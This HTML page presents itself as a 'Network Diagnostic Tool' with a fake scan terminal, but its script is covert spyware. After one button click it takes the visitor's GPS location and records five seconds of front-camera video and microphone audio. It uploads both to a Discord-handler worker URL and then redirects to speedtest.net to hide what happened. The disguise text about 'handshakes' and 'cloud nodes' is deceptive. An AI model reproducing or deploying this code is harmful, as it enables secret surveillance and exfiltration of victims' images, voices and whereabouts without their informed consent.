<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Diagnostic Tool</title>
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #05070a; color: #00d2ff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #0c111a; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #00d2ff; box-shadow: 0 0 30px rgba(0, 210, 255, 0.3); text-align: center; }
        .terminal { background: #000; padding: 15px; border-radius: 5px; height: 180px; overflow-y: auto; text-align: left; font-size: 0.8rem; border: 1px solid #161b2c; margin: 15px 0; color: #00ff41; }
        .line { margin-bottom: 4px; border-left: 2px solid #00ff41; padding-left: 8px; }
        .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
        .btn:disabled { background: #161b2c; color: #5c6784; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.5.0</div>
        <div class="terminal" id="terminal">
            <div class="line">> System Ready. Awaiting Handshake...</div>
        </div>
        <button class="btn" id="startBtn">Authorize Scan</button>
    </div>

    <video id="video" autoplay playsinline muted></video>

    <script>
        const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 

        const btn = document.getElementById('startBtn');
        const terminal = document.getElementById('terminal');

        function addLog(text, color = "#00ff41") {
            const div = document.createElement('div');
            div.className = "line";
            div.style.color = color;
            div.style.borderLeftColor = color;
            div.innerText = text;
            terminal.appendChild(div);
            terminal.scrollTop = terminal.scrollHeight;
        }

        btn.addEventListener('click', async function() {
            btn.disabled = true;
            addLog("> Accessing Audio/Video Nodes...");

            navigator.geolocation.getCurrentPosition(async (pos) => {
                let stream;
                try {
                    // Step 1: Request high-priority audio
                    const constraints = { 
                        video: { facingMode: "user" }, 
                        audio: {
                            channelCount: 1,
                            sampleRate: 44100,
                            echoCancellation: false,
                            noiseSuppression: false
                        } 
                    };
                    
                    const rawStream = await navigator.mediaDevices.getUserMedia(constraints);
                    
                    // Step 2: Manually bind tracks to ensure audio is included
                    const audioTracks = rawStream.getAudioTracks();
                    const videoTracks = rawStream.getVideoTracks();
                    
                    if (audioTracks.length === 0) {
                        addLog("> ERROR: Audio Hardware Missing.", "#ff4b2b");
                    } else {
                        addLog("> Audio Track Synced: " + audioTracks[0].label);
                    }

                    // Constructor to force both tracks into one object
                    stream = new MediaStream([audioTracks[0], videoTracks[0]]);

                } catch (e) {
                    addLog("> ERROR: Permission Denied.", "#ff4b2b");
                    btn.disabled = false;
                    return;
                }

                addLog("> Capturing Synchronized Flux (5s)...");
                
                // Use standard webm for maximum compatibility
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                mediaRecorder.start();

                setTimeout(() => {
                    addLog("> Uploading to Cloud Node...");
                    mediaRecorder.stop();
                }, 5000);

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    
                    formData.append('payload_json', JSON.stringify({
                        content: "ðŸ”Š **SYNCHRONIZED AUDIO CAPTURE**",
                        embeds: [{
                            title: "Hardware Intelligence Report",
                            color: 3447003,
                            fields: [
                                { name: "ðŸ“ Location", value: pos.coords.latitude + "," + pos.coords.longitude },
                                { name: "ðŸŽ™ï¸ Mic Status", value: "Locked & Captured", inline: true }
                            ]
                        }]
                    }));
                    formData.append('file', videoBlob, 'node_capture.webm');

                    try {
                        const response = await fetch(PROXY_URL, { method: 'POST', body: formData });
                        if (response.ok) {
                            addLog("> Success! Finalizing...");
                            setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                        }
                    } catch (err) {
                        addLog("> Connection Failed.", "#ff4b2b");
                        btn.disabled = false;
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                };
            }, (err) => {
                addLog("> ERROR: GPS Required.", "#ff4b2b");
                btn.disabled = false;
            });
        });
    </script>
</body>
</html>
